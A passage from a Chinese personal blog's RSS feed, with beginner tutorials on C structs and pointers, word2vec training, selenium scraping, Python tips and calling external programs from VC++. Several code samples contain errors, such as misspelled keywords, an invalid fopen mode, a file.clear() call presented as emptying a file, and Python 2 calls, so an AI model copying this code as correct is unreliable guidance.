&lt;li>结构体的声明，其实只是定义了一个由用户个人定义的一种数据类型，我们真正要使用的时候还需要重新真正声明一个结构体实际变量.正如上面代码例子中给出的那样。&lt;/li>
&lt;li>除了上述的声明结构体实际变量的写法，我们还有如下几种其他方式&lt;/li>
&lt;/ul>
&lt;pre tabindex="0">&lt;code>//如此我们在声明一个DATE结构体类型的同时，声明了一个date的结构体实体变量
stuct DATE{
int year;
int month;
int day;
}date;
//如果我们并不打算在别的地方使用这种结构体类型，只是单纯的为了声明这样一个结构体实体变量，还可以省略结构体类型名称
struct{
int year;
int month;
}date1;
//这个还是定义一个结构体类型DATE
typedef stuct{
int year;
int month;
}DATE;
&lt;/code>&lt;/pre>&lt;/li>
&lt;/ul>
&lt;hr>
&lt;ol>
&lt;li>
&lt;h3 id="枚举结构">枚举结构&lt;/h3>
&lt;p>&lt;del>这是本垃圾博主很少使用的一种结构&lt;/del>&lt;/p>
&lt;pre tabindex="0">&lt;code>enum WEEK{
Monday=1,
Tuesday,
Wednesday,
Thursday,
Friday,
Saturday,
Sunday
}
WEEK day;
/*
你也可以使用这种写法多写一个单词
enum WEEK day;
当然也可以像结构体一样声明枚举类型，到实体化枚举变量一气呵成
enum WEEK{
Monday=1,
Tuesday,
Wednesday,
Thursday,
Friday,
Saturday,
Sunday
} day;
*/
&lt;/code>&lt;/pre>&lt;ul>
&lt;li>第一个枚举类型成员值默认为整形0，后续枚举成员默认值为前一个成员+1.&lt;/li>
&lt;/ul>
&lt;pre tabindex="0">&lt;code>enum season {spring, summer=3, autumn, winter};
&lt;/code>&lt;/pre>&lt;ul>
&lt;li>没有指定值的枚举元素，其值为前一元素加 1。也就说 spring 的值为 0，summer 的值为 3，autumn 的值为 4，winter 的值为 5&lt;/li>
&lt;/ul>
&lt;/li>
&lt;/ol>
&lt;hr>
&lt;h2 id="指针">指针&lt;/h2>
&lt;ul>
&lt;li>
&lt;p>&lt;del>无数萌新惨死在这里&lt;/del>&lt;/p>
&lt;/li>
&lt;li>
&lt;p>指针是一种变量类型，这种类型可以存储另一个变量的地址，地址即另一个变量在内存中的位置&lt;/p>
&lt;/li>
&lt;li>
&lt;p>你可以使用指针里存储的地址来访问另一个变量的值，修改另一个变量&lt;/p>
&lt;/li>
&lt;/ul>
&lt;ol>
&lt;li>
&lt;h3 id="声明方法">声明方法&lt;/h3>
&lt;pre tabindex="0">&lt;code>基础数据类型 *变量名
&lt;/code>&lt;/pre>&lt;ul>
&lt;li>举例1：&lt;/li>
&lt;/ul>
&lt;pre tabindex="0">&lt;code>int *p0;
short *p1;
long *p2;
char *p3;
float *p4;
&lt;/code>&lt;/pre>&lt;/li>
&lt;/ol>
&lt;ul>
&lt;li>
&lt;p>基本的数据类型都可以声明其对应的指针变量&lt;/p>
&lt;/li>
&lt;li>
&lt;p>一种类型的指针变量只可以存储对应类型变量的地址。列如int*型的指针变量，所存储的地址指向的位置必定存储的也是一个int型的数据&lt;/p>
&lt;/li>
&lt;li>
&lt;p>举例2：&lt;/p>
&lt;pre tabindex="0">&lt;code>struct TEST{
int a,b;
};
TEST* p0;
&lt;/code>&lt;/pre>&lt;/li>
&lt;li>
&lt;p>我们也可以声明一个结构体类型，并且声明一个指向该结构体类型的指针变量&lt;/p>
&lt;hr>
&lt;/li>
&lt;/ul>
&lt;ol>
&lt;li>
&lt;h3 id="指针使用">指针使用&lt;/h3>
&lt;ul>
&lt;li>基本使用&lt;/li>
&lt;/ul>
&lt;pre tabindex="0">&lt;code>#include&amp;lt;stdio.h&amp;gt;
int main(){
int *p=NULL; //声明指针变量，并初始化为NULL（即0）NULL是C语言里约定的空指针值
int a; //声明一个正常整形变量
a=1; //将a赋值为1
p=&amp;amp;a; //将a的地址赋值给指针变量
//&amp;amp; 符号，取变量的地址
printf(&amp;quot;a=%d\np=%p\n*p=%d&amp;quot;,a,p,*p);
a=22; //改变a的值
printf(&amp;quot;\na=%d\np=%p\n*p=%d&amp;quot;,a,p,*p);
return 0;
}
&lt;/code>&lt;/pre>&lt;ul>
&lt;li>样例输出&lt;/li>
&lt;/ul>
&lt;pre tabindex="0">&lt;code>a=1 //a的值
p=000000000062FE44 //p的值，即a的地址
*p=1 //p所指向的地址所存储的值，即a的值
a=22
p=000000000062FE44 //同上
*p=22
&lt;/code>&lt;/pre>&lt;/li>
&lt;/ol>
&lt;ul>
&lt;li>&lt;a class="link" href="http://www.runoob.com/cprogramming/c-pointers.html" target="_blank" rel="noopener"
>更多c语言指针相关教程&lt;/a>&lt;/li>
&lt;/ul>
&lt;hr>
&lt;h2 id="文件操作">文件操作&lt;/h2>
&lt;ul>
&lt;li>程序是用了来处理数据的，而数据实质就是存储在磁盘上的文件，因而文件操作是程序员必须学习的基础&lt;/li>
&lt;/ul>
&lt;pre tabindex="0">&lt;code>FILE *f=NULL; //声明一个文件指针
char buff[100]; //声明一个字符串数组
char ch; //声明一个字符变量
int x; //声明一个整形变量
f=fopen(&amp;quot;test.txt&amp;quot;,&amp;quot;wr&amp;quot;); //打开文件，“wr”指定可读可写
ch=fgetc(f); //从文件中读取单个字符赋值给ch
fscanf(f,&amp;quot;%s&amp;quot;,buff); //从文件中读取字符串赋值给buff字符串数组
fscanf(f,&amp;quot;%d&amp;quot;,&amp;amp;x); //从文件中读取一个整形变量
fgets(buff,100,f); //从文件中读取字符串，并存放到buff中，指定最大长度100
fprintf(f,&amp;quot;%s\n&amp;quot;,buff); //向文件中写入字符串数组
fputc(ch,f); //向文件中写入单个字符
fputs(buff,f); //向文件中写入字符串
&lt;/code>&lt;/pre>&lt;h2 id="后记">后记&lt;/h2>
&lt;ul>
&lt;li>
&lt;p>指针我这里暂时咕了，指针可以说是c语言的精髓，也意味着贯穿了整个c语言的所有内容，如果完成指针部分可能又花当前篇幅的一半。所以这里只有一个最最最基础的指针使用。如果你还需要详细的指针学习，推荐你前往&lt;a class="link" href="http://www.runoob.com/cprogramming/c-pointers.html" target="_blank" rel="noopener"
>这里&lt;/a>,或许之后我也可能会把指针单独独立的讲解一次。&lt;/p>
&lt;/li>
&lt;li>
&lt;p>写着整个教程花了我接近三天的时间，而且越是到后面意志越是消沉（所以我写到指针咕咕咕了）&lt;/p>
&lt;/li>
&lt;li>
&lt;p>而且我知道这样实在是一个写的不怎么样的教程。&lt;/p>
&lt;/li>
&lt;li>
&lt;p>本教程尽量挑选了基础性的，使用较为常见的知识点进行讲解，并以本人自认为合适的一种顺序组织安排了全部内容&lt;/p>
&lt;/li>
&lt;li>
&lt;p>如果这篇博客能帮到你，非常高兴。&lt;/p>
&lt;/li>
&lt;li>
&lt;p>如果觉得博客有问题，欢迎邮件交流。&lt;/p>
&lt;/li>
&lt;/ul></description></item><item><title>word2vec词向量训练</title><link>https://blog.yuukisama.cc/p/word2vec%E8%AF%8D%E5%90%91%E9%87%8F%E8%AE%AD%E7%BB%83/</link><pubDate>Wed, 13 Mar 2019 10:26:22 +0000</pubDate><guid>https://blog.yuukisama.cc/p/word2vec%E8%AF%8D%E5%90%91%E9%87%8F%E8%AE%AD%E7%BB%83/</guid><description>&lt;blockquote>
&lt;h2 id="概述">概述&lt;/h2>
&lt;/blockquote>
&lt;ul>
&lt;li>
&lt;p>最近踩坑机器学习神经网络中的文本处理,所以有了这篇博客.记录一下基于python word2vec训练中文词向量的方法(英文也同样适用)
&lt;del>虽然事后我发现我需要的并不是词向量word2vec,而是训练获得句子向量的方法,权当做个预告吧(咕咕咕)&lt;/del>&lt;/p>
&lt;/li>
&lt;li>
&lt;p>词向量训练:在自然语言处理中将每个单词映射到一个空间向量过程,从而获得每个词汇之间的关联性.(可能说的不太对,大概就这样吧,不是理论帝)&lt;/p>
&lt;/li>
&lt;/ul>
&lt;p>&lt;figure
>
&lt;a href="https://blog.yuukisama.cc/0.jpg" >
&lt;img src="https://blog.yuukisama.cc/0.jpg"
loading="lazy"
alt=" 少数正经的图">
&lt;/a>
&lt;figcaption>少数正经的图&lt;/figcaption>
&lt;/figure>&lt;/p>
&lt;h2 id="start">Start&lt;/h2>
&lt;ul>
&lt;li>python:3.5+&lt;/li>
&lt;/ul>
&lt;ol>
&lt;li>
&lt;p>安装相应依赖&lt;/p>
&lt;pre tabindex="0">&lt;code>pip install jieba
pip install gensim
&lt;/code>&lt;/pre>&lt;ul>
&lt;li>jieba用于中文文本分词,英文可直接使用空格分割分词&lt;/li>
&lt;li>gensim词向量训练模块&lt;/li>
&lt;/ul>
&lt;/li>
&lt;li>
&lt;p>数据预处理&lt;/p>
&lt;pre tabindex="0">&lt;code>def load():
with open(&amp;quot;./train.tsv&amp;quot;,&amp;quot;r&amp;quot;,encoding=&amp;quot;utf-8&amp;quot;) as f:
lines=f.readlines()
f.close()
return lines
return None
&lt;/code>&lt;/pre>&lt;p>这里采用的数据格式是以'\t&amp;rsquo;分割的tsv文件,每一行包含一个句子以及其对应标签.这里将二者共同训练&lt;/p>
&lt;/li>
&lt;li>
&lt;p>分词并去除停止词&lt;/p>
&lt;ul>
&lt;li>停止词:指句子中的语气词,特殊符号,数字等对句子意义判别无帮助的词汇,这里推荐几个常用的中文停止词表,你也可以一句自己项目需要自己制作适合的停止词表&lt;a class="link" href="https://github.com/goto456/stopwords" target="_blank" rel="noopener"
>Github&lt;/a>&lt;/li>
&lt;/ul>
&lt;pre tabindex="0">&lt;code># 导入结巴分词
import jieba
# 读取停止词表函数,停止词表为一行一个的格式
def load_stopwords():
with open(&amp;quot;./stopwords.txt&amp;quot;,&amp;quot;r&amp;quot;,encoding=&amp;quot;utf-8&amp;quot;) as f:
words=f.readlines()
f.close()
return words
return None
# 装载停止词表
stopowrds=load_stopwords()
# 分词去除停止词函数,lines为上一步中读取的单行数据,将所有的分词保存到文本文件中为下一步训练备用
def cut(lines):
with open(&amp;quot;cutwords.txt&amp;quot;,&amp;quot;w+&amp;quot;,encoding=&amp;quot;utf-8&amp;quot;) as f:
for line in lines:
words=jieba.cut(line)
#去除停止词
for i in words:
if i in stopwords:
words.remove(i)
f.write(&amp;quot; &amp;quot;.join(words))
f.wirte(&amp;quot;\n&amp;quot;)
&lt;/code>&lt;/pre>&lt;/li>
&lt;li>
&lt;p>模型训练&lt;/p>
&lt;pre tabindex="0">&lt;code># 导入词向量训练模块
from gensim.models import word2vec
from gensim.models.word2vec import LineSentence
# 训练函数
def model_train(
sentence_in=sentence, # 需要训练的数据
size_in=300, # 生成的词向量维数,训练数据量越大,推荐数值越大
window_in=5, # 滑动窗口大小,涉及到单个词语关联前后单词的数目
min_count_in=2, # 字典截断,出现次数少于该数值的词汇会被放弃
iter_in=5 # 迭代次数
):
print(&amp;quot;start traing...&amp;quot;)
model=word2vec.Word2Vec(
sentences=sentence_in,
size=size_in,
window=window_in,
min_count=min_count_in,
workers=multiprocessing.cpu_count(),
iter=iter_in
)
print(&amp;quot;traing complete...&amp;quot;)
return model
# 从之前完成分词的数据中装载训练数据,模型sentence参数可以是一个list
# 但是大批量数据时建议使用word2vec自带的类型导入
sentence=LineSentence(&amp;quot;./cutwords.txt&amp;quot;)
model=model_train(sentence,300,5,2,5)
&lt;/code>&lt;/pre>&lt;/li>
&lt;li>
&lt;p>保存模型&lt;/p>
&lt;pre tabindex="0">&lt;code># 参数为保存的文件名
model.save(&amp;quot;modeltest&amp;quot;)
&lt;/code>&lt;/pre>&lt;/li>
&lt;li>
&lt;p>模型的二次训练&lt;/p>
&lt;pre tabindex="0">&lt;code># 读取模型
model = gensim.models.Word2Vec.load('modeltest')
# 追加训练
model.train(more_sentences)
&lt;/code>&lt;/pre>&lt;/li>
&lt;li>
&lt;p>模型使用&lt;/p>
&lt;pre tabindex="0">&lt;code># 根据给定的词汇给出10个最相近的词汇
model.most_similar(&amp;quot;男人&amp;quot;)
# 找出离群词
model.doesnt_match(&amp;quot;测试&amp;quot;)
# 计算两个词汇相似度
model.similarity('男人', '女人')
# 获得单个词汇的词向量
model['男人']
&lt;/code>&lt;/pre>&lt;/li>
&lt;/ol></description></item><item><title>高阶爬虫selenium摘记</title><link>https://blog.yuukisama.cc/p/%E9%AB%98%E9%98%B6%E7%88%AC%E8%99%ABselenium%E6%91%98%E8%AE%B0/</link><pubDate>Fri, 08 Mar 2019 14:46:18 +0000</pubDate><guid>https://blog.yuukisama.cc/p/%E9%AB%98%E9%98%B6%E7%88%AC%E8%99%ABselenium%E6%91%98%E8%AE%B0/</guid><description>&lt;h2 id="概述">概述&lt;/h2>
&lt;ul>
&lt;li>
&lt;p>本文记录一些有关python高阶爬虫selenium+浏览器爬虫操作的踩坑记录.&lt;/p>
&lt;/li>
&lt;li>
&lt;p>selenium&lt;/p>
&lt;p>本质是一个为了自动化测试而诞生的工具,但没想到ta自身作为一个爬虫也是极具优势的.&lt;/p>
&lt;p>selenium简单的说就是通过各种webdirver驱动去控制浏览器去访问网站,完成各种操作,从而达到爬取数据的目的.可以有效的规避多数反爬虫机制,列如用js动态生成的网站&lt;/p>
&lt;/li>
&lt;/ul>
&lt;p>&lt;figure
class="gallery-image"
style="
flex-grow: 192;
flex-basis: 461px"
>
&lt;a href="https://blog.yuukisama.cc/p/%E9%AB%98%E9%98%B6%E7%88%AC%E8%99%ABselenium%E6%91%98%E8%AE%B0/selenium.jpeg" data-size="1280x666">
&lt;img src="https://blog.yuukisama.cc/p/%E9%AB%98%E9%98%B6%E7%88%AC%E8%99%ABselenium%E6%91%98%E8%AE%B0/selenium.jpeg"
width="1280"
height="666"
srcset="https://blog.yuukisama.cc/p/%E9%AB%98%E9%98%B6%E7%88%AC%E8%99%ABselenium%E6%91%98%E8%AE%B0/selenium_hu1a85fdc8012b385a5c1655565cef00ab_85451_480x0_resize_q75_box.jpeg 480w, https://blog.yuukisama.cc/p/%E9%AB%98%E9%98%B6%E7%88%AC%E8%99%ABselenium%E6%91%98%E8%AE%B0/selenium_hu1a85fdc8012b385a5c1655565cef00ab_85451_1024x0_resize_q75_box.jpeg 1024w"
loading="lazy"
>
&lt;/a>
&lt;/figure>&lt;/p>
&lt;h2 id="start">Start&lt;/h2>
&lt;p>python version:3.5+&lt;/p>
&lt;p>browser:Chrome&lt;/p>
&lt;p>webdriver:chromedriver&lt;/p>
&lt;p>platform:Windows 10&lt;/p>
&lt;ol>
&lt;li>
&lt;p>首先安装selenium包&lt;/p>
&lt;pre tabindex="0">&lt;code>pip install selenium
&lt;/code>&lt;/pre>&lt;/li>
&lt;li>
&lt;p>在命令行中尝试引入selenium库,如果不报错证明安装成功&lt;/p>
&lt;pre tabindex="0">&lt;code>import selenium
&lt;/code>&lt;/pre>&lt;/li>
&lt;li>
&lt;p>依据你准备选用的浏览器下载对应版本的webdriver.本文以chrome浏览器为例,依据chrome浏览器版本下载对应的chromedriver&lt;/p>
&lt;p>&lt;a class="link" href="https://npm.taobao.org/mirrors/chromedriver" target="_blank" rel="noopener"
>chromedriver download&lt;/a>&lt;/p>
&lt;ul>
&lt;li>
&lt;p>关于webdriver的配置.&lt;/p>
&lt;p>webdriver事实上是一个可执行文件,为了能够让程序调用它,所以需要配置其环境变量.win下最偷懒的方法自然是把ta丢进system32里.&lt;/p>
&lt;p>当然有高阶操作可以装载指定目录中的webdriver,以及可以指定浏览器可执行文件目录等,这部分操作参见自定义webdriver以及浏览器可执行文件&lt;/p>
&lt;/li>
&lt;/ul>
&lt;/li>
&lt;li>
&lt;p>让我们开始第一个例子打开百度首页&lt;/p>
&lt;pre tabindex="0">&lt;code>#-*- coding:utf-8 -*-
# 从selenium包中导入webdriver
from selenium import webdriver
# 声明一个chrome对象
dirver=webdriver.Chrome()
# 用chrome打开百度首页
driver.get(&amp;quot;https://www.baidu.com/&amp;quot;)
&lt;/code>&lt;/pre>&lt;/li>
&lt;li>
&lt;p>&lt;a class="link" href="https://blog.csdn.net/yj1556492839/article/details/79671008" target="_blank" rel="noopener"
>更多基础操作&lt;/a>&lt;/p>
&lt;p>&lt;del>容我偷个懒&lt;/del>&lt;/p>
&lt;/li>
&lt;/ol>
&lt;h2 id="advance">Advance&lt;/h2>
&lt;p>&lt;del>其实也就是一系列踩坑行为&lt;/del>&lt;/p>
&lt;ol>
&lt;li>
&lt;h3 id="自定义webdriver以及浏览器可执行文件">自定义webdriver以及浏览器可执行文件&lt;/h3>
&lt;pre tabindex="0">&lt;code>#-*- coding:utf-8 -*-
from selenium import webdirver
# 声明一个chrome设置对象
options=webdriver.ChromeOptions()
# 指定浏览器可执行文件路径
options._binary_location=&amp;quot;./Application/chrome.exe&amp;quot;
# 利用chrome设置对形象作为参数初始化webdriver对象,executable_path即webdriver路径
chrome=webdriver.Chrome(chrome_options=options,executable_path=&amp;quot;./chromedriver.exe&amp;quot;)
# 打开百度首页
chrome.get(&amp;quot;https://www.baidu.com/&amp;quot;)
&lt;/code>&lt;/pre>&lt;/li>
&lt;/ol>
&lt;ul>
&lt;li>&lt;strong>不指定浏览器可执行文件目录,默认启动系统浏览器.个人拙见为了软件的移植性下载32位版本的二进制可执行文件放在脚本下属目录,使用参数指定浏览器可执行文件路径&lt;/strong>&lt;/li>
&lt;/ul>
&lt;ol>
&lt;li>
&lt;h3 id="设置浏览器启动参数">设置浏览器启动参数&lt;/h3>
&lt;ul>
&lt;li>
&lt;p>普通参数&lt;/p>
&lt;pre tabindex="0">&lt;code>#-*- coding:utf-8 -*-
from selenium import webdirver
# 声明一个chrome设置对象
options=webdriver.ChromeOptions()
# 禁用gpu加速
options.add_argument(&amp;quot;--disable-gpu&amp;quot;)
# 允许加载不安全内容
options.add_argument('--allow-running-insecure-content')
# 禁用插件
options.add_argument('--disable-extensions')
# 使用无头浏览器,即不显示浏览器图形化界面,适用于没有图形化界面的服务器
options.add_argument('--headless')
chrome=webdriver.Chrome(chrome_options=options)
&lt;/code>&lt;/pre>&lt;/li>
&lt;li>
&lt;p>实验性参数&lt;/p>
&lt;pre tabindex="0">&lt;code>appState = {
&amp;quot;recentDestinations&amp;quot;: [ {
&amp;quot;id&amp;quot;: &amp;quot;Save as PDF&amp;quot;,
&amp;quot;origin&amp;quot;: &amp;quot;local&amp;quot;
} ],
&amp;quot;selectedDestinationId&amp;quot;: &amp;quot;Save as PDF&amp;quot;,
&amp;quot;version&amp;quot;: 2
}
profile = {
'printing.print_preview_sticky_settings.appState': json.dumps(appState)
}
options.add_experimental_option(&amp;quot;prefs&amp;quot;,profile)
&lt;/code>&lt;/pre>&lt;/li>
&lt;li>
&lt;p>&lt;a class="link" href="https://peter.sh/experiments/chromium-command-line-switches/" target="_blank" rel="noopener"
>更多启动参数设置参见文档&lt;/a>&lt;/p>
&lt;/li>
&lt;/ul>
&lt;/li>
&lt;li>
&lt;p>执行JavaScript脚本&lt;/p>
&lt;pre tabindex="0">&lt;code>#-*- coding:utf-8 -*-
from selenium import webdirver
chrome=webdriver.Chrome()
# 设置js代码执行超时时间
chrome.set_script_timeout(30)
chrome.get(&amp;quot;http://www.baidu.com/&amp;quot;)
# 异步执行js代码
chrome.execute_script(&amp;quot;alert(&amp;quot;Halloworld&amp;quot;);&amp;quot;)
# 阻塞执行js代码
chrome.execute_async_script(&amp;quot;alert(&amp;quot;halloworld&amp;quot;);&amp;quot;)
&lt;/code>&lt;/pre>&lt;ul>
&lt;li>execute_script函数是异步执行js代码.&lt;/li>
&lt;li>execute_async_script是阻塞执行,即会等待js执行完成再执行接下来的程序.&lt;/li>
&lt;li>set_script_timeout是设置js执行超时时间,对于阻塞执行的js代码,在timeout设定的时间内没有能够完成将强行终止.这个timeout值默认是30s&lt;/li>
&lt;/ul>
&lt;/li>
&lt;/ol></description></item><item><title>Python常用Skill</title><link>https://blog.yuukisama.cc/p/python%E5%B8%B8%E7%94%A8skill/</link><pubDate>Fri, 25 Jan 2019 17:01:19 +0000</pubDate><guid>https://blog.yuukisama.cc/p/python%E5%B8%B8%E7%94%A8skill/</guid><description>&lt;h2 id="python常用技能汇总">Python常用技能汇总&lt;/h2>
&lt;ul>
&lt;li>这里是一些写python脚本时常用的小技巧,长期更新
&lt;del>咕咕咕&lt;/del>&lt;/li>
&lt;/ul>
&lt;p>&lt;figure
>
&lt;a href="https://blog.yuukisama.cc/Python.jpg" >
&lt;img src="https://blog.yuukisama.cc/Python.jpg"
loading="lazy"
alt="Python娘,来源于萌娘百科">
&lt;/a>
&lt;figcaption>Python娘,来源于萌娘百科&lt;/figcaption>
&lt;/figure>&lt;/p>
&lt;hr>
&lt;h3 id="获取脚本目录">获取脚本目录&lt;/h3>
&lt;ul>
&lt;li>脚本运行时相对路径时基于命令行的路径.这样直接在脚本里使用相对路径会出现问题.我们可以使用如下方法获得脚本所在的绝对路径,以及脚本本身的文件名.
&lt;pre tabindex="0">&lt;code>import os
WORK_PATH,FILE_NAME=os.path.split(os.path.abspath(__file__))
&lt;/code>&lt;/pre>&lt;ul>
&lt;li>WORK_PATH中就存储了脚本所在的绝对路径&lt;/li>
&lt;li>FILE_NAME中就是脚本名称&lt;/li>
&lt;/ul>
&lt;/li>
&lt;/ul>
&lt;hr>
&lt;h3 id="获取windows用户目录">获取Windows用户目录&lt;/h3>
&lt;ul>
&lt;li>有时我们需要获取用户默认的下载目录,或者是文档目录等等
&lt;pre tabindex="0">&lt;code>import os
USER_PATH=os.path.expanduser(&amp;quot;~&amp;quot;)
DOWNLOAD_PATH=ps.path.join(os.path.expanduser(&amp;quot;~&amp;quot;),&amp;quot;Download&amp;quot;)
&lt;/code>&lt;/pre>&lt;ul>
&lt;li>USER_PATH中存储了用户目录的绝对路径&lt;/li>
&lt;li>DOWNLOAD_PATH中存储了用户默认下载目录(如果用户没有自己重命名这个文件夹的话)&lt;/li>
&lt;/ul>
&lt;/li>
&lt;/ul>
&lt;hr>
&lt;h3 id="python参数传递中的args以及kwargs">Python参数传递中的*args以及**kwargs&lt;/h3>
&lt;ul>
&lt;li>
&lt;p>事实上真正的python参数传递语法是* 和 **。*args和**kwargs是我们一种约定俗成的写法。&lt;/p>
&lt;/li>
&lt;li>
&lt;h4 id="args">*args&lt;/h4>
&lt;ul>
&lt;li>
&lt;p>*args用来表示函数接受可变长度的 &lt;strong>非关键字&lt;/strong> 参数作为函数的输入&lt;/p>
&lt;pre tabindex="0">&lt;code>def test(normal_arg, *args):
print(&amp;quot;first normal arg:&amp;quot;+normal_arg)
for i,x in enumerate(args):
print(&amp;quot;{} arg is {}&amp;quot;.format(i+1,x))
test(&amp;quot;normal&amp;quot;,&amp;quot;a&amp;quot;,&amp;quot;b&amp;quot;,&amp;quot;c&amp;quot;,&amp;quot;d&amp;quot;)
&lt;/code>&lt;/pre>&lt;/li>
&lt;li>
&lt;p>样例输出&lt;/p>
&lt;pre tabindex="0">&lt;code>first normal arg:normal
1 arg is a
2 arg is b
3 arg is c
4 arg is d
&lt;/code>&lt;/pre>&lt;/li>
&lt;/ul>
&lt;/li>
&lt;li>
&lt;h4 id="kwargs">**kwargs&lt;/h4>
&lt;ul>
&lt;li>**kwargs表示函数接受可变长度的关键字参数字典作为参数，即可以简单的理解为传入的是字典参数
&lt;pre tabindex="0">&lt;code>def test(**kwargs):
if kwargs is not None:
for key, value in kwargs.iteritems():
print(&amp;quot;{} = {}&amp;quot;.format(key,value))
# Or you can visit kwargs like a dict() object
# for key in kwargs:
# print(&amp;quot;{} = {}&amp;quot;.format(key, kwargs[key]))
test(name=&amp;quot;python&amp;quot;, value=&amp;quot;5&amp;quot;)
&lt;/code>&lt;/pre>&lt;/li>
&lt;li>样例输出
&lt;pre tabindex="0">&lt;code>name = python
value = 5
&lt;/code>&lt;/pre>&lt;/li>
&lt;/ul>
&lt;/li>
&lt;li>
&lt;h4 id="whats-more">What&amp;rsquo;s more&lt;/h4>
&lt;ul>
&lt;li>
&lt;p>我们也可以使用这两个参数来调用一般参数格式的函数&lt;/p>
&lt;pre tabindex="0">&lt;code>def func(arg1,arg2,arg3):
print(&amp;quot;arg1: &amp;quot; + arg1)
print(&amp;quot;arg2: &amp;quot; + arg2)
print(&amp;quot;arg3: &amp;quot; + arg3)
args_list=(&amp;quot;python&amp;quot;,2,3)
func(*args_list)
print(&amp;quot;==================&amp;quot;)
kwargs_dict={&amp;quot;arg3&amp;quot;: 3, &amp;quot;arg1&amp;quot;: &amp;quot;python&amp;quot;, &amp;quot;arg2&amp;quot;: 2}
func(**kwargs_dict)
&lt;/code>&lt;/pre>&lt;/li>
&lt;li>
&lt;p>样例输出:&lt;/p>
&lt;pre tabindex="0">&lt;code>arg1: python
arg2: 2
arg3: 3
==================
arg1: python
arg2: 2
arg3: 3
&lt;/code>&lt;/pre>&lt;/li>
&lt;/ul>
&lt;/li>
&lt;li>
&lt;p>本段参考简书 &lt;a class="link" href="https://www.jianshu.com/p/be92113116c8" target="_blank" rel="noopener"
>https://www.jianshu.com/p/be92113116c8&lt;/a>&lt;/p>
&lt;/li>
&lt;/ul></description></item><item><title>VC++调用外部exe并获取程序运行输出</title><link>https://blog.yuukisama.cc/p/vc-%E8%B0%83%E7%94%A8%E5%A4%96%E9%83%A8exe%E5%B9%B6%E8%8E%B7%E5%8F%96%E7%A8%8B%E5%BA%8F%E8%BF%90%E8%A1%8C%E8%BE%93%E5%87%BA/</link><pubDate>Thu, 17 Jan 2019 12:16:36 +0000</pubDate><guid>https://blog.yuukisama.cc/p/vc-%E8%B0%83%E7%94%A8%E5%A4%96%E9%83%A8exe%E5%B9%B6%E8%8E%B7%E5%8F%96%E7%A8%8B%E5%BA%8F%E8%BF%90%E8%A1%8C%E8%BE%93%E5%87%BA/</guid><description>&lt;blockquote>
&lt;h2 id="摘要">摘要&lt;/h2>
&lt;/blockquote>
&lt;ul>
&lt;li>
&lt;p>最近在采坑某个项目，需要用到调用外部写好的exe运行，项目基于c语言，于是就有了关于&lt;strong>VC++调用外部程序并获取程序命令行运行输出的问题&lt;/strong>&lt;/p>
&lt;/li>
&lt;li>
&lt;p>本文将围绕windows下调用外部exe程序的常见的几种方法展开。部分方法可能也适用于linux平台。&lt;/p>
&lt;/li>
&lt;li>
&lt;p>&lt;del>虽然到最后我的项目也没能具体应用上这项技术&lt;/del>&lt;/p>
&lt;/li>
&lt;li>
&lt;p>本文将会涉及到的主要函数:&lt;/p>
&lt;ul>
&lt;li>system()&lt;/li>
&lt;li>winexec()&lt;/li>
&lt;li>ShellExecute()&lt;/li>
&lt;li>CreateProcess()&lt;/li>
&lt;/ul>
&lt;/li>
&lt;/ul>
&lt;p>&lt;figure
>
&lt;a href="https://blog.yuukisama.cc/lobei.jpg" >
&lt;img src="https://blog.yuukisama.cc/lobei.jpg"
loading="lazy"
alt="萝卜啊！赐予我力量！">
&lt;/a>
&lt;figcaption>萝卜啊！赐予我力量！&lt;/figcaption>
&lt;/figure>&lt;/p>
&lt;h2 id="综述">综述&lt;/h2>
&lt;p>在调用外部exe程序的同时还想要获得程序运行过程中的输出内容。本文介绍的主要是使用管道的方法。不涉及内存共享等一类的方法。&lt;/p>
&lt;p>本文中假定所有的父程序即parent.exe；子程序为child.exe&lt;/p>
&lt;ul>
&lt;li>子程序源码
&lt;pre tabindex="0">&lt;code>#include&amp;lt;iostream&amp;gt;
using namespace std;
int main(int argc, char* arg[]){
int x=argc;
cout&amp;lt;&amp;lt;x&amp;lt;&amp;lt;endl;
for(int i=0;i&amp;lt;x;i++)
cout&amp;lt;&amp;lt;arg[i]&amp;lt;&amp;lt;endl;
return 0;
}
&lt;/code>&lt;/pre>&lt;/li>
&lt;/ul>
&lt;h2 id="system">System()&lt;/h2>
&lt;ul>
&lt;li>
&lt;p>这是c/c++的标准函数之一，可以执行命令行命令。也可以在linux下调用。&lt;a class="link" href="http://www.cplusplus.com/reference/cstdlib/system/" target="_blank" rel="noopener"
>详情文档参见cplusplus&lt;/a>&lt;/p>
&lt;/li>
&lt;li>
&lt;p>函数原型&lt;/p>
&lt;pre tabindex="0">&lt;code>int system(const char* command)
&lt;/code>&lt;/pre>&lt;ul>
&lt;li>
&lt;p>调用命令处理器执行命令，win下可以理解为调用cmd.exe。如果执行的命令参数为空，该函数会检测命令处理器是否可用。&lt;/p>
&lt;/li>
&lt;li>
&lt;p>返回值：&lt;/p>
&lt;p>如果命令参数为空，如果命令处理器可用该函数返回一个非零值。反之返回0&lt;/p>
&lt;p>如果命令参数不为空，返回值取决于你所执行的命令。&lt;/p>
&lt;/li>
&lt;/ul>
&lt;/li>
&lt;li>
&lt;p>调用子程序并获得其回显&lt;/p>
&lt;p>这里使用的是默认的命令行将所有的命令执行的输出结果重定向到result.txt中，之后我们只需要使用文件操作读取result.txt中的内容即可。&lt;/p>
&lt;p>&lt;strong>坑：&lt;/strong> 命令行重定向输出到文件采用的是末尾追加的打开方式，为了保证程序每次执行结果不受上次执行结果的干扰，建议每次在读取完result.txt中的内容之后将文件清空。&lt;/p>
&lt;pre tabindex="0">&lt;code>#include&amp;lt;iostream&amp;gt;
#include&amp;lt;cstdlib&amp;gt;
#include&amp;lt;fstream&amp;gt;
using namespace std;
int main(){
char buffer[4096]={0}; //用于文件读取
system(&amp;quot;.\\child.exe argv1 argv2 argv3 &amp;gt;&amp;gt;.\\result.txt&amp;quot;);//执行子程序并传入参数
fstream file(&amp;quot;.\\result.txt&amp;quot;); //读取结果文件
while(file.is_open() &amp;amp;&amp;amp; !file.eof()){
file.read(buffer,4096);
cout&amp;lt;&amp;lt;buffer&amp;lt;&amp;lt;endl;
}
file.clear(); //清空文件内容方便下次读取
file.close(); //关闭文件
}
&lt;/code>&lt;/pre>&lt;/li>
&lt;li>
&lt;p>父程序输出样例&lt;/p>
&lt;pre tabindex="0">&lt;code>4
.\child.exe
argv1
argv2
gv3
&lt;/code>&lt;/pre>&lt;p>参数0为程序本身，参数1为传入的参数
